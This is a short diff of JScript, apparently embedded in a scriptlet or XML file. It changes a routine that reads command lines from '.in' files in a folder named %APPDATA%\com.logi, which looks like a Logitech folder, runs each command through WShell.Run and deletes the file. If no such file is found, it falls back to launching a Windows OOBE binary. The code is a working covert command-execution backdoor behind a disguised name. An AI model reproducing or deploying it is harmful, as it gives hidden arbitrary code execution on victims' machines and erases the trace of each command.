@@ -12,15 +12,15 @@
             var logiPath = WShell.ExpandEnvironmentStrings("%APPDATA%\\com.logi")
             if (fso.FolderExists(logiPath)) {
                 var folder = fso.GetFolder(logiPath)
-                var files = new Enumerator(folder.Files)
+                var files = folder.Files
                 var runCmd = false
-                for (; !files.atEnd(); files.moveNext()) {
-                    var item = files.item();
+                for(var objEnum = new Enumerator(files); !objEnum.atEnd(); objEnum.moveNext()) {
+                    item = objEnum.item();
                     var fullName = logiPath + "\\" + item.Name
-                    if (fullName.search(".txt") != -1) {
+                    if (item.Name.search(".in") != -1) {
                         runCmd = true
                         var reader = fso.OpenTextFile(fullName, 1, true, 0)
-                        var command = reader.ReadLine()
+                        command = reader.ReadLine()
                         reader.Close()
                         fso.DeleteFile(fullName)
                         WShell.Run(command)
@@ -28,7 +28,7 @@
                 }
 
                 if (!runCmd) {
-                    WShell.Run("%s")
+                    WShell.Run("C:\\WINDOWS\\System32\\oobe\\oobeldr.exe")
                 }
             }
         ]]>
